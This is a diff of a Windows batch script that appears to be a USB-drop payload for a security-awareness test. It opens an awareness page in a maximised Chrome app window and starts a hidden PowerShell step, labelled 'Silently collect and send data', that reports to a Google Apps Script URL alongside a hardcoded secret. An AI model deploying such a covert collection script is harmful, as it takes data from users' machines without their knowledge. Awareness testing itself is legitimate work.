@@ -5,7 +5,7 @@
 :: ============================================================
  
 set SHEETS_URL=https://script.google.com/macros/s/AKfycbzszdfs_6r9JSblLJwT14h79hR9Ufj5ZrB3aanNLB2N4pjuaF8epylp6zKpTB2VclC2/exec
-set MARKETING_URL=https://www.khipu-networks.com/
+set MARKETING_URL=https://www.khipuawareness.co.uk/awareness/c8803bb920f32a6582260029c7404d983055d89355d291102c9fd2bea82e93e9/11/index.html
 set USB_ID=USB-001
 set SECRET=@kDeGGisN9UW
  
@@ -18,7 +18,10 @@ exit /b
  
 :run
 :: Open marketing page immediately
-start "" "%MARKETING_URL%"
+start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --app="%MARKETING_URL%"
+timeout /t 2 >nul
+powershell -command "$sig='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; Add-Type -MemberDefinition $sig -Name Win32 -Namespace Win32Functions; $hwnd = (Get-Process chrome | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object -First 1).MainWindowHandle; [Win32Functions.Win32]::ShowWindowAsync($hwnd, 3)"
+
  
 :: Silently collect and send data
 powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command ^
@@ -31,4 +34,5 @@ powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command ^
  
 :: Cleanup temp vbs
 del "%temp%\silent_usb.vbs" >nul 2>&1
+ 
  
